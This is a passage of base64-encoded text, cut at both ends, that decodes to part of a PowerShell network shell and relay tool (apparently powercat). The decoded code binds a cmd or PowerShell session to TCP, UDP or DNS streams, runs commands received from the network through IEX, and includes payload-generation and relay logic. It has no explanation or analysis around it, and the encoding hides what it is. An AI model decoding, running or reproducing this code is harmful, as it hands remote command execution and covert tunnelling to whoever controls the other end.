XRlc1JlYWQgLWVxIDApe2JyZWFrfQogICAgICAkRGF0YSArPSAkRnVuY1ZhcnNbIlN0ZEVyckRlc3RpbmF0aW9uQnVmZmVyIl1bMC4uKFtpbnRdJFN0ZEVyckJ5dGVzUmVhZC0xKV0KICAgICAgJEZ1bmNWYXJzWyJTdGRFcnJSZWFkT3BlcmF0aW9uIl0gPSAkRnVuY1ZhcnNbIlByb2Nlc3MiXS5TdGFuZGFyZEVycm9yLkJhc2VTdHJlYW0uQmVnaW5SZWFkKCRGdW5jVmFyc1siU3RkRXJyRGVzdGluYXRpb25CdWZmZXIiXSwgMCwgNjU1MzYsICRudWxsLCAkbnVsbCkKICAgIH0KICAgIHJldHVybiAkRGF0YSwkRnVuY1ZhcnMKICB9CiAgZnVuY3Rpb24gV3JpdGVEYXRhX0NNRAogIHsKICAgIHBhcmFtKCREYXRhLCRGdW5jVmFycykKICAgICRGdW5jVmFyc1siUHJvY2VzcyJdLlN0YW5kYXJkSW5wdXQuV3JpdGVMaW5lKCRGdW5jVmFyc1siRW5jb2RpbmciXS5HZXRTdHJpbmcoJERhdGEpLlRyaW1FbmQoImByIikuVHJpbUVuZCgiYG4iKSkKICAgIHJldHVybiAkRnVuY1ZhcnMKICB9CiAgZnVuY3Rpb24gQ2xvc2VfQ01ECiAgewogICAgcGFyYW0oJEZ1bmNWYXJzKQogICAgJEZ1bmNWYXJzWyJQcm9jZXNzIl0gfCBTdG9wLVByb2Nlc3MKICB9ICAKICAjIyMjIyMjIyMjIENNRCBGVU5DVElPTlMgIyMjIyMjIyMjIwogIAogICMjIyMjIyMjIyMgUE9XRVJTSEVMTCBGVU5DVElPTlMgIyMjIyMjIyMjIwogIGZ1bmN0aW9uIE1haW5fUG93ZXJzaGVsbAogIHsKICAgIHBhcmFtKCRTdHJlYW0xU2V0dXBWYXJzKSAgIAogICAgdHJ5CiAgICB7CiAgICAgICRlbmNvZGluZyA9IE5ldy1PYmplY3QgU3lzdGVtLlRleHQuQXNjaWlFbmNvZGluZwogICAgICBbYnl0ZVtdXSRJbnB1dFRvV3JpdGUgPSBAKCkKICAgICAgaWYoJGkgLW5lICRudWxsKQogICAgICB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiSW5wdXQgZnJvbSAtaSBkZXRlY3RlZC4uLiIKICAgICAgICBpZihUZXN0LVBhdGggJGkpeyBbYnl0ZVtdXSRJbnB1dFRvV3JpdGUgPSAoW2lvLmZpbGVdOjpSZWFkQWxsQnl0ZXMoJGkpKSB9CiAgICAgICAgZWxzZWlmKCRpLkdldFR5cGUoKS5OYW1lIC1lcSAiQnl0ZVtdIil7IFtieXRlW11dJElucHV0VG9Xcml0ZSA9ICRpIH0KICAgICAgICBlbHNlaWYoJGkuR2V0VHlwZSgpLk5hbWUgLWVxICJTdHJpbmciKXsgW2J5dGVbXV0kSW5wdXRUb1dyaXRlID0gJEVuY29kaW5nLkdldEJ5dGVzKCRpKSB9CiAgICAgICAgZWxzZXtXcml0ZS1Ib3N0ICJVbnJlY29nbmlzZWQgaW5wdXQgdHlwZS4iIDsgcmV0dXJufQogICAgICB9CiAgICAKICAgICAgV3JpdGUtVmVyYm9zZSAiU2V0dGluZyB1cCBTdHJlYW0gMS4uLiAoRVNDL0NUUkwgdG8gZXhpdCkiCiAgICAgIHRyeXskU3RyZWFtMVZhcnMgPSBTdHJlYW0xX1NldHVwICRTdHJlYW0xU2V0dXBWYXJzfQogICAgICBjYXRjaHtXcml0ZS1WZXJib3NlICJTdHJlYW0gMSBTZXR1cCBGYWlsdXJlIiA7IGJyZWFrfQogICAgICAKICAgICAgV3JpdGUtVmVyYm9zZSAiU2V0dGluZyB1cCBTdHJlYW0gMi4uLiAoRVNDL0NUUkwgdG8gZXhpdCkiCiAgICAgIHRyeQogICAgICB7CiAgICAgICAgJEludHJvUHJvbXB0ID0gJEVuY29kaW5nLkdldEJ5dGVzKCJXaW5kb3dzIFBvd2VyU2hlbGxgbkNvcHlyaWdodCAoQykgMjAxMyBNaWNyb3NvZnQgQ29ycG9yYXRpb24uIEFsbCByaWdodHMgcmVzZXJ2ZWQuYG5gbiIgKyAoIlBTICIgKyAocHdkKS5QYXRoICsgIj4gIikpCiAgICAgICAgJFByb21wdCA9ICgiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiKQogICAgICAgICRDb21tYW5kVG9FeGVjdXRlID0gIiIgICAgICAKICAgICAgICAkRGF0YSA9ICRudWxsCiAgICAgIH0KICAgICAgY2F0Y2gKICAgICAgewogICAgICAgIFdyaXRlLVZlcmJvc2UgIlN0cmVhbSAyIFNldHVwIEZhaWx1cmUiIDsgYnJlYWsKICAgICAgfQogICAgICAKICAgICAgaWYoJElucHV0VG9Xcml0ZSAtbmUgQCgpKQogICAgICB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiV3JpdGluZyBpbnB1dCB0byBTdHJlYW0gMS4uLiIKICAgICAgICB0cnl7JFN0cmVhbTFWYXJzID0gU3RyZWFtMV9Xcml0ZURhdGEgJElucHV0VG9Xcml0ZSAkU3RyZWFtMVZhcnN9CiAgICAgICAgY2F0Y2h7V3JpdGUtSG9zdCAiRmFpbGVkIHRvIHdyaXRlIGlucHV0IHRvIFN0cmVhbSAxIiA7IGJyZWFrfQogICAgICB9CiAgICAgIAogICAgICBpZigkZCl7V3JpdGUtVmVyYm9zZSAiLWQgKGRpc2Nvbm5lY3QpIEFjdGl2YXRlZC4gRGlzY29ubmVjdGluZy4uLiIgOyBicmVha30KICAgICAgCiAgICAgIFdyaXRlLVZlcmJvc2UgIkJvdGggQ29tbXVuaWNhdGlvbiBTdHJlYW1zIEVzdGFibGlzaGVkLiBSZWRpcmVjdGluZyBEYXRhIEJldHdlZW4gU3RyZWFtcy4uLiIKICAgICAgd2hpbGUoJFRydWUpCiAgICAgIHsgICAgICAgIAogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICMjIyMjIFN0cmVhbTIgUmVhZCAjIyMjIwogICAgICAgICAgJFByb21wdCA9ICRudWxsCiAgICAgICAgICAkUmV0dXJuZWREYXRhID0gJG51bGwKICAgICAgICAgIGlmKCRDb21tYW5kVG9FeGVjdXRlIC1uZSAiIikKICAgICAgICAgIHsKICAgICAgICAgICAgdHJ5e1tieXRlW11dJFJldHVybmVkRGF0YSA9ICRFbmNvZGluZy5HZXRCeXRlcygoSUVYICRDb21tYW5kVG9FeGVjdXRlIDI+JjEgfCBPdXQtU3RyaW5nKSl9CiAgICAgICAgICAgIGNhdGNoe1tieXRlW11dJFJldHVybmVkRGF0YSA9ICRFbmNvZGluZy5HZXRCeXRlcygoJF8gfCBPdXQtU3RyaW5nKSl9CiAgICAgICAgICAgICRQcm9tcHQgPSAkRW5jb2RpbmcuR2V0Qnl0ZXMoKCJQUyAiICsgKHB3ZCkuUGF0aCArICI+ICIpKQogICAgICAgICAgfQogICAgICAgICAgJERhdGEgKz0gJEludHJvUHJvbXB0CiAgICAgICAgICAkSW50cm9Qcm9tcHQgPSAkbnVsbAogICAgICAgICAgJERhdGEgKz0gJFJldHVybmVkRGF0YQogICAgICAgICAgJERhdGEgKz0gJFByb21wdAogICAgICAgICAgJENvbW1hbmRUb0V4ZWN1dGUgPSAiIgogICAgICAgICAgIyMjIyMgU3RyZWFtMiBSZWFkICMjIyMjCgogICAgICAgICAgaWYoJERhdGEgLW5lICRudWxsKXskU3RyZWFtMVZhcnMgPSBTdHJlYW0xX1dyaXRlRGF0YSAkRGF0YSAkU3RyZWFtMVZhcnN9CiAgICAgICAgICAkRGF0YSA9ICRudWxsCiAgICAgICAgfQogICAgICAgIGNhdGNoCiAgICAgICAgewogICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRmFpbGVkIHRvIHJlZGlyZWN0IGRhdGEgZnJvbSBTdHJlYW0gMiB0byBTdHJlYW0gMSIgOyBicmVhawogICAgICAgIH0KICAgICAgICAKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAkRGF0YSwkU3RyZWFtMVZhcnMgPSBTdHJlYW0xX1JlYWREYXRhICRTdHJlYW0xVmFycwogICAgICAgICAgaWYoJERhdGEgLW5lICRudWxsKXskQ29tbWFuZFRvRXhlY3V0ZSA9ICRFbmNvZGluZy5HZXRTdHJpbmcoJERhdGEpfQogICAgICAgICAgJERhdGEgPSAkbnVsbAogICAgICAgIH0KICAgICAgICBjYXRjaAogICAgICAgIHsKICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkZhaWxlZCB0byByZWRpcmVjdCBkYXRhIGZyb20gU3RyZWFtIDEgdG8gU3RyZWFtIDIiIDsgYnJlYWsKICAgICAgICB9CiAgICAgIH0KICAgIH0KICAgIGZpbmFsbHkKICAgIHsKICAgICAgdHJ5CiAgICAgIHsKICAgICAgICBXcml0ZS1WZXJib3NlICJDbG9zaW5nIFN0cmVhbSAxLi4uIgogICAgICAgIFN0cmVhbTFfQ2xvc2UgJFN0cmVhbTFWYXJzCiAgICAgIH0KICAgICAgY2F0Y2gKICAgICAgewogICAgICAgIFdyaXRlLVZlcmJvc2UgIkZhaWxlZCB0byBjbG9zZSBTdHJlYW0gMSIKICAgICAgfQogICAgfQogIH0KICAjIyMjIyMjIyMjIFBPV0VSU0hFTEwgRlVOQ1RJT05TICMjIyMjIyMjIyMKCiAgIyMjIyMjIyMjIyBDT05TT0xFIEZVTkNUSU9OUyAjIyMjIyMjIyMjCiAgZnVuY3Rpb24gU2V0dXBfQ29uc29sZQogIHsKICAgIHBhcmFtKCRGdW5jU2V0dXBWYXJzKQogICAgJEZ1bmNWYXJzID0gQHt9CiAgICAkRnVuY1ZhcnNbIkVuY29kaW5nIl0gPSBOZXctT2JqZWN0IFN5c3RlbS5UZXh0LkFzY2lpRW5jb2RpbmcKICAgICRGdW5jVmFyc1siT3V0cHV0Il0gPSAkRnVuY1NldHVwVmFyc1swXQogICAgJEZ1bmNWYXJzWyJPdXRwdXRCeXRlcyJdID0gW2J5dGVbXV1AKCkKICAgICRGdW5jVmFyc1siT3V0cHV0U3RyaW5nIl0gPSAiIgogICAgcmV0dXJuICRGdW5jVmFycwogIH0KICBmdW5jdGlvbiBSZWFkRGF0YV9Db25zb2xlCiAgewogICAgcGFyYW0oJEZ1bmNWYXJzKQogICAgJERhdGEgPSAkbnVsbAogICAgaWYoJEhvc3QuVUkuUmF3VUkuS2V5QXZhaWxhYmxlKQogICAgewogICAgICAkRGF0YSA9ICRGdW5jVmFyc1siRW5jb2RpbmciXS5HZXRCeXRlcygoUmVhZC1Ib3N0KSArICJgbiIpCiAgICB9CiAgICByZXR1cm4gJERhdGEsJEZ1bmNWYXJzCiAgfQogIGZ1bmN0aW9uIFdyaXRlRGF0YV9Db25zb2xlCiAgewogICAgcGFyYW0oJERhdGEsJEZ1bmNWYXJzKQogICAgc3dpdGNoKCRGdW5jVmFyc1siT3V0cHV0Il0pCiAgICB7CiAgICAgICJIb3N0IiB7V3JpdGUtSG9zdCAtbiAkRnVuY1ZhcnNbIkVuY29kaW5nIl0uR2V0U3RyaW5nKCREYXRhKX0KICAgICAgIlN0cmluZyIgeyRGdW5jVmFyc1siT3V0cHV0U3RyaW5nIl0gKz0gJEZ1bmNWYXJzWyJFbmNvZGluZyJdLkdldFN0cmluZygkRGF0YSl9CiAgICAgICJCeXRlcyIgeyRGdW5jVmFyc1siT3V0cHV0Qnl0ZXMiXSArPSAkRGF0YX0KICAgIH0KICAgIHJldHVybiAkRnVuY1ZhcnMKICB9CiAgZnVuY3Rpb24gQ2xvc2VfQ29uc29sZQogIHsKICAgIHBhcmFtKCRGdW5jVmFycykKICAgIGlmKCRGdW5jVmFyc1siT3V0cHV0U3RyaW5nIl0gLW5lICIiKXtyZXR1cm4gJEZ1bmNWYXJzWyJPdXRwdXRTdHJpbmciXX0KICAgIGVsc2VpZigkRnVuY1ZhcnNbIk91dHB1dEJ5dGVzIl0gLW5lIEAoKSl7cmV0dXJuICRGdW5jVmFyc1siT3V0cHV0Qnl0ZXMiXX0KICAgIHJldHVybgogIH0KICAjIyMjIyMjIyMjIENPTlNPTEUgRlVOQ1RJT05TICMjIyMjIyMjIyMKICAKICAjIyMjIyMjIyMjIE1BSU4gRlVOQ1RJT04gIyMjIyMjIyMjIwogIGZ1bmN0aW9uIE1haW4KICB7CiAgICBwYXJhbSgkU3RyZWFtMVNldHVwVmFycywkU3RyZWFtMlNldHVwVmFycykKICAgIHRyeQogICAgewogICAgICBbYnl0ZVtdXSRJbnB1dFRvV3JpdGUgPSBAKCkKICAgICAgaWYoJGkgLW5lICRudWxsKQogICAgICB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiSW5wdXQgZnJvbSAtaSBkZXRlY3RlZC4uLiIKICAgICAgICBpZihUZXN0LVBhdGggJGkpeyBbYnl0ZVtdXSRJbnB1dFRvV3JpdGUgPSAoW2lvLmZpbGVdOjpSZWFkQWxsQnl0ZXMoJGkpKSB9CiAgICAgICAgZWxzZWlmKCRpLkdldFR5cGUoKS5OYW1lIC1lcSAiQnl0ZVtdIil7IFtieXRlW11dJElucHV0VG9Xcml0ZSA9ICRpIH0KICAgICAgICBlbHNlaWYoJGkuR2V0VHlwZSgpLk5hbWUgLWVxICJTdHJpbmciKXsgW2J5dGVbXV0kSW5wdXRUb1dyaXRlID0gJEVuY29kaW5nLkdldEJ5dGVzKCRpKSB9CiAgICAgICAgZWxzZXtXcml0ZS1Ib3N0ICJVbnJlY29nbmlzZWQgaW5wdXQgdHlwZS4iIDsgcmV0dXJufQogICAgICB9CiAgICAgIAogICAgICBXcml0ZS1WZXJib3NlICJTZXR0aW5nIHVwIFN0cmVhbSAxLi4uIgogICAgICB0cnl7JFN0cmVhbTFWYXJzID0gU3RyZWFtMV9TZXR1cCAkU3RyZWFtMVNldHVwVmFyc30KICAgICAgY2F0Y2h7V3JpdGUtVmVyYm9zZSAiU3RyZWFtIDEgU2V0dXAgRmFpbHVyZSIgOyBicmVha30KICAgICAgCiAgICAgIFdyaXRlLVZlcmJvc2UgIlNldHRpbmcgdXAgU3RyZWFtIDIuLi4iCiAgICAgIHRyeXskU3RyZWFtMlZhcnMgPSBTdHJlYW0yX1NldHVwICRTdHJlYW0yU2V0dXBWYXJzfQogICAgICBjYXRjaHtXcml0ZS1WZXJib3NlICJTdHJlYW0gMiBTZXR1cCBGYWlsdXJlIiA7IGJyZWFrfQogICAgICAKICAgICAgJERhdGEgPSAkbnVsbAogICAgICAKICAgICAgaWYoJElucHV0VG9Xcml0ZSAtbmUgQCgpKQogICAgICB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiV3JpdGluZyBpbnB1dCB0byBTdHJlYW0gMS4uLiIKICAgICAgICB0cnl7JFN0cmVhbTFWYXJzID0gU3RyZWFtMV9Xcml0ZURhdGEgJElucHV0VG9Xcml0ZSAkU3RyZWFtMVZhcnN9CiAgICAgICAgY2F0Y2h7V3JpdGUtSG9zdCAiRmFpbGVkIHRvIHdyaXRlIGlucHV0IHRvIFN0cmVhbSAxIiA7IGJyZWFrfQogICAgICB9CiAgICAgIAogICAgICBpZigkZCl7V3JpdGUtVmVyYm9zZSAiLWQgKGRpc2Nvbm5lY3QpIEFjdGl2YXRlZC4gRGlzY29ubmVjdGluZy4uLiIgOyBicmVha30KICAgICAgCiAgICAgIFdyaXRlLVZlcmJvc2UgIkJvdGggQ29tbXVuaWNhdGlvbiBTdHJlYW1zIEVzdGFibGlzaGVkLiBSZWRpcmVjdGluZyBEYXRhIEJldHdlZW4gU3RyZWFtcy4uLiIKICAgICAgd2hpbGUoJFRydWUpCiAgICAgIHsKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAkRGF0YSwkU3RyZWFtMlZhcnMgPSBTdHJlYW0yX1JlYWREYXRhICRTdHJlYW0yVmFycwogICAgICAgICAgaWYoJERhdGEgLW5lICRudWxsKXskU3RyZWFtMVZhcnMgPSBTdHJlYW0xX1dyaXRlRGF0YSAkRGF0YSAkU3RyZWFtMVZhcnN9CiAgICAgICAgICAkRGF0YSA9ICRudWxsCiAgICAgICAgfQogICAgICAgIGNhdGNoCiAgICAgICAgewogICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRmFpbGVkIHRvIHJlZGlyZWN0IGRhdGEgZnJvbSBTdHJlYW0gMiB0byBTdHJlYW0gMSIgOyBicmVhawogICAgICAgIH0KICAgICAgICAKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAkRGF0YSwkU3RyZWFtMVZhcnMgPSBTdHJlYW0xX1JlYWREYXRhICRTdHJlYW0xVmFycwogICAgICAgICAgaWYoJERhdGEgLW5lICRudWxsKXskU3RyZWFtMlZhcnMgPSBTdHJlYW0yX1dyaXRlRGF0YSAkRGF0YSAkU3RyZWFtMlZhcnN9CiAgICAgICAgICAkRGF0YSA9ICRudWxsCiAgICAgICAgfQogICAgICAgIGNhdGNoCiAgICAgICAgewogICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRmFpbGVkIHRvIHJlZGlyZWN0IGRhdGEgZnJvbSBTdHJlYW0gMSB0byBTdHJlYW0gMiIgOyBicmVhawogICAgICAgIH0KICAgICAgfQogICAgfQogICAgZmluYWxseQogICAgewogICAgICB0cnkKICAgICAgewogICAgICAgIFdyaXRlLVZlcmJvc2UgIkNsb3NpbmcgU3RyZWFtIDIuLi4iCiAgICAgICAgU3RyZWFtMl9DbG9zZSAkU3RyZWFtMlZhcnMKICAgICAgfQogICAgICBjYXRjaAogICAgICB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiRmFpbGVkIHRvIGNsb3NlIFN0cmVhbSAyIgogICAgICB9CiAgICAgIHRyeQogICAgICB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ2xvc2luZyBTdHJlYW0gMS4uLiIKICAgICAgICBTdHJlYW0xX0Nsb3NlICRTdHJlYW0xVmFycwogICAgICB9CiAgICAgIGNhdGNoCiAgICAgIHsKICAgICAgICBXcml0ZS1WZXJib3NlICJGYWlsZWQgdG8gY2xvc2UgU3RyZWFtIDEiCiAgICAgIH0KICAgIH0KICB9CiAgIyMjIyMjIyMjIyBNQUlOIEZVTkNUSU9OICMjIyMjIyMjIyMKICAKICAjIyMjIyMjIyMjIEdFTkVSQVRFIFBBWUxPQUQgIyMjIyMjIyMjIwogIGlmKCR1KQogIHsKICAgIFdyaXRlLVZlcmJvc2UgIlNldCBTdHJlYW0gMTogVURQIgogICAgJEZ1bmN0aW9uU3RyaW5nID0gKCJmdW5jdGlvbiBTdHJlYW0xX1NldHVwYG57YG4iICsgJHtmdW5jdGlvbjpTZXR1cF9VRFB9ICsgImBufWBuYG4iKQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMV9SZWFkRGF0YWBue2BuIiArICR7ZnVuY3Rpb246UmVhZERhdGFfVURQfSArICJgbn1gbmBuIikKICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTFfV3JpdGVEYXRhYG57YG4iICsgJHtmdW5jdGlvbjpXcml0ZURhdGFfVURQfSArICJgbn1gbmBuIikKICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTFfQ2xvc2VgbntgbiIgKyAke2Z1bmN0aW9uOkNsb3NlX1VEUH0gKyAiYG59YG5gbiIpICAgIAogICAgaWYoJGwpeyRJbnZva2VTdHJpbmcgPSAiTWFpbiBAKCcnLGAkVHJ1ZSwnJHAnLCckdCcpICJ9CiAgICBlbHNleyRJbnZva2VTdHJpbmcgPSAiTWFpbiBAKCckYycsYCRGYWxzZSwnJHAnLCckdCcpICJ9CiAgfQogIGVsc2VpZigkZG5zIC1uZSAiIikKICB7CiAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDE6IEROUyIKICAgICRGdW5jdGlvblN0cmluZyA9ICgiZnVuY3Rpb24gU3RyZWFtMV9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfRE5TfSArICJgbn1gbmBuIikKICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTFfUmVhZERhdGFgbntgbiIgKyAke2Z1bmN0aW9uOlJlYWREYXRhX0ROU30gKyAiYG59YG5gbiIpCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0xX1dyaXRlRGF0YWBue2BuIiArICR7ZnVuY3Rpb246V3JpdGVEYXRhX0ROU30gKyAiYG59YG5gbiIpCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0xX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9ETlN9ICsgImBufWBuYG4iKQogICAgaWYoJGwpe3JldHVybiAiVGhpcyBmZWF0dXJlIGlzIG5vdCBhdmFpbGFibGUuIn0KICAgIGVsc2V7JEludm9rZVN0cmluZyA9ICJNYWluIEAoJyRjJywnJHAnLCckRG9tYWluJywkZG5zZnQpICJ9CiAgfQogIGVsc2UKICB7CiAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDE6IFRDUCIKICAgICRGdW5jdGlvblN0cmluZyA9ICgiZnVuY3Rpb24gU3RyZWFtMV9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfVENQfSArICJgbn1gbmBuIikKICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTFfUmVhZERhdGFgbntgbiIgKyAke2Z1bmN0aW9uOlJlYWREYXRhX1RDUH0gKyAiYG59YG5gbiIpCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0xX1dyaXRlRGF0YWBue2BuIiArICR7ZnVuY3Rpb246V3JpdGVEYXRhX1RDUH0gKyAiYG59YG5gbiIpCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0xX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9UQ1B9ICsgImBufWBuYG4iKQogICAgaWYoJGwpeyRJbnZva2VTdHJpbmcgPSAiTWFpbiBAKCcnLGAkVHJ1ZSwkcCwkdCkgIn0KICAgIGVsc2V7JEludm9rZVN0cmluZyA9ICJNYWluIEAoJyRjJyxgJEZhbHNlLCRwLCR0KSAifQogIH0KICAKICBpZigkZSAtbmUgIiIpCiAgewogICAgV3JpdGUtVmVyYm9zZSAiU2V0IFN0cmVhbSAyOiBQcm9jZXNzIgogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfQ01EfSArICJgbn1gbmBuIikKICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfUmVhZERhdGFgbntgbiIgKyAke2Z1bmN0aW9uOlJlYWREYXRhX0NNRH0gKyAiYG59YG5gbiIpCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1dyaXRlRGF0YWBue2BuIiArICR7ZnVuY3Rpb246V3JpdGVEYXRhX0NNRH0gKyAiYG59YG5gbiIpCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9DTUR9ICsgImBufWBuYG4iKQogICAgJEludm9rZVN0cmluZyArPSAiQCgnJGUnKWBuYG4iCiAgfQogIGVsc2VpZigkZXApCiAgewogICAgV3JpdGUtVmVyYm9zZSAiU2V0IFN0cmVhbSAyOiBQb3dlcnNoZWxsIgogICAgJEludm9rZVN0cmluZyArPSAiYG5gbiIKICB9CiAgZWxzZWlmKCRyIC1uZSAiIikKICB7CiAgICBpZigkci5zcGxpdCgiOiIpWzBdLlRvTG93ZXIoKSAtZXEgInVkcCIpCiAgICB7CiAgICAgIFdyaXRlLVZlcmJvc2UgIlNldCBTdHJlYW0gMjogVURQIgogICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1NldHVwYG57YG4iICsgJHtmdW5jdGlvbjpTZXR1cF9VRFB9ICsgImBufWBuYG4iKQogICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1JlYWREYXRhYG57YG4iICsgJHtmdW5jdGlvbjpSZWFkRGF0YV9VRFB9ICsgImBufWBuYG4iKQogICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1dyaXRlRGF0YWBue2BuIiArICR7ZnVuY3Rpb246V3JpdGVEYXRhX1VEUH0gKyAiYG59YG5gbiIpCiAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfQ2xvc2VgbntgbiIgKyAke2Z1bmN0aW9uOkNsb3NlX1VEUH0gKyAiYG59YG5gbiIpICAgIAogICAgICBpZigkci5zcGxpdCgiOiIpLkNvdW50IC1lcSAyKXskSW52b2tlU3RyaW5nICs9ICgiQCgnJyxgJFRydWUsJyIgKyAkci5zcGxpdCgiOiIpWzFdICsgIicsJyR0JykgIil9CiAgICAgIGVsc2VpZigkci5zcGxpdCgiOiIpLkNvdW50IC1lcSAzKXskSW52b2tlU3RyaW5nICs9ICgiQCgnIiArICRyLnNwbGl0KCI6IilbMV0gKyAiJyxgJEZhbHNlLCciICsgJHIuc3BsaXQoIjoiKVsyXSArICInLCckdCcpICIpfQogICAgICBlbHNle3JldHVybiAiQmFkIHJlbGF5IGZvcm1hdC4ifQogICAgfQogICAgaWYoJHIuc3BsaXQoIjoiKVswXS5Ub0xvd2VyKCkgLWVxICJkbnMiKQogICAgewogICAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDI6IEROUyIKICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfRE5TfSArICJgbn1gbmBuIikKICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9SZWFkRGF0YWBue2BuIiArICR7ZnVuY3Rpb246UmVhZERhdGFfRE5TfSArICJgbn1gbmBuIikKICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9Xcml0ZURhdGFgbntgbiIgKyAke2Z1bmN0aW9uOldyaXRlRGF0YV9ETlN9ICsgImBufWBuYG4iKQogICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9ETlN9ICsgImBufWBuYG4iKQogICAgICBpZigkci5zcGxpdCgiOiIpLkNvdW50IC1lcSAyKXtyZXR1cm4gIlRoaXMgZmVhdHVyZSBpcyBub3QgYXZhaWxhYmxlLiJ9CiAgICAgIGVsc2VpZigkci5zcGxpdCgiOiIpLkNvdW50IC1lcSA0KXskSW52b2tlU3RyaW5nICs9ICgiQCgnIiArICRyLnNwbGl0KCI6IilbMV0gKyAiJywnIiArICRyLnNwbGl0KCI6IilbMl0gKyAiJywnIiArICRyLnNwbGl0KCI6IilbM10gKyAiJywkZG5zZnQpICIpfQogICAgICBlbHNle3JldHVybiAiQmFkIHJlbGF5IGZvcm1hdC4ifQogICAgfQogICAgZWxzZWlmKCRyLnNwbGl0KCI6IilbMF0uVG9Mb3dlcigpIC1lcSAidGNwIikKICAgIHsKICAgICAgV3JpdGUtVmVyYm9zZSAiU2V0IFN0cmVhbSAyOiBUQ1AiCiAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfU2V0dXBgbntgbiIgKyAke2Z1bmN0aW9uOlNldHVwX1RDUH0gKyAiYG59YG5gbiIpCiAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfUmVhZERhdGFgbntgbiIgKyAke2Z1bmN0aW9uOlJlYWREYXRhX1RDUH0gKyAiYG59YG5gbiIpCiAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfV3JpdGVEYXRhYG57YG4iICsgJHtmdW5jdGlvbjpXcml0ZURhdGFfVENQfSArICJgbn1gbmBuIikKICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9DbG9zZWBue2BuIiArICR7ZnVuY3Rpb246Q2xvc2VfVENQfSArICJgbn1gbmBuIikKICAgICAgaWYoJHIuc3BsaXQoIjoiKS5Db3VudCAtZXEgMil7JEludm9rZVN0cmluZyArPSAoIkAoJycsYCRUcnVlLCciICsgJHIuc3BsaXQoIjoiKVsxXSArICInLCckdCcpICIpfQogICAgICBlbHNlaWYoJHIuc3BsaXQoIjoiKS5Db3VudCAtZXEgMyl7JEludm9rZVN0cmluZyArPSAoIkAoJyIgKyAkci5zcGxpdCgiOiIpWzFdICsgIicsYCRGYWxzZSwnIiArICRyLnNwbGl0KCI6IilbMl0gKyAiJywnJHQnKSAiKX0KICAgICAgZWxzZXtyZXR1cm4gIkJhZCByZWxheSBmb3JtYXQuIn0KICAgIH0KICB9CiAgZWxzZQogIHsKICAgIFdyaXRlLVZlcmJvc2UgIlNldCBTdHJlYW0gMjogQ29uc29sZSIKICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfU2V0dXBgbntgbiIgKyAke2Z1bmN0aW9uOl